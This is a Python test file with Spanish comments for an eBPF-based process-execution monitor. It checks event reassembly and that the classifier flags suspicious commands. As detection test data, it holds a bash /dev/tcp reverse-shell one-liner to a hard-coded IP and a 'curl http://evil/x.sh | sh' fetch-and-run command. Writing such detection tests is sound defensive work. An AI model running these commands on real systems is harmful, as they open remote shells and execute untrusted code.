"""Tests puros de EbpfExec: build_info + reutilización del clasificador.

No requieren bcc ni kernel: sólo comprueban que el reensamblado del evento
eBPF produce el mismo veredicto que execwatch (la fuente cambia, la lógica no).
"""
from centinel.core import Severity
from centinel.collectors.ebpf_exec import build_info
from centinel.collectors.execwatch import classify


def test_build_info_basico():
    info = build_info("bash", "/bin/bash", ["-c", "echo hola"])
    assert info["comm"] == "bash"
    assert info["exe"] == "/bin/bash"
    assert "echo hola" in info["cmdline"]


def test_build_info_sin_argv_usa_filename():
    info = build_info("id", "/usr/bin/id", [])
    assert info["exe"] == "/usr/bin/id"
    assert info["cmdline"] == "/usr/bin/id"


def test_build_info_limpia_control_chars():
    info = build_info("ba\x00sh", "/bin/ba\x01sh", ["-c\x02"])
    assert "\x00" not in info["comm"]
    assert "\x01" not in info["exe"]


def test_reverse_shell_devtcp_detectada():
    # El mismo one-liner que en execwatch, ahora vía eventos eBPF.
    info = build_info("bash", "/bin/bash",
                      ["-i", ">&", "/dev/tcp/45.135.232.17/4444", "0>&1"])
    flags, sev = classify(info)
    assert sev == int(Severity.CRITICAL)
    assert any("/dev/tcp" in f for f in flags)


def test_curl_pipe_shell_detectada():
    info = build_info("sh", "/bin/sh",
                      ["-c", "curl http://evil/x.sh | sh"])
    flags, sev = classify(info)
    assert sev >= int(Severity.HIGH)


def test_proceso_benigno_no_alerta():
    info = build_info("ls", "/bin/ls", ["-la", "/home"])
    flags, sev = classify(info)
    assert sev < int(Severity.HIGH)


def test_exec_desde_tmp_es_high():
    info = build_info("x", "/tmp/.malware", [])
    flags, sev = classify(info)
    assert sev >= int(Severity.HIGH)
